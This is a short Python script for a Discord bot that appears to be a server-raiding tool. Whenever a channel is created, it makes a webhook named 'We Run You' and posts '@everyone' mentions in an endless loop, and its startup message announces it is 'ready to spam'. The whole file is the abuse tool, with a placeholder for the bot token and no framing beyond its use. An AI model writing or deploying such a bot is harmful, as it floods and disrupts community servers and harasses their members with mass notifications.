import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

SPAM_MESSAGE = ["@everyone"]
WEBHOOK_NAME = "We Run You"

token = "UR BOT TOKEN HERE"
client = commands.Bot(command_prefix="!")

@client.event
async def on_ready():
   print("ready to spam. Logged in as {client.user}")

@client.event
async def on_guild_channel_create(channel):
 web = await channel.create_webhook(name=WEBHOOK_NAME)
  
 while True:
    await web.send(SPAM_MESSAGE)

client.run(token, bot=True)
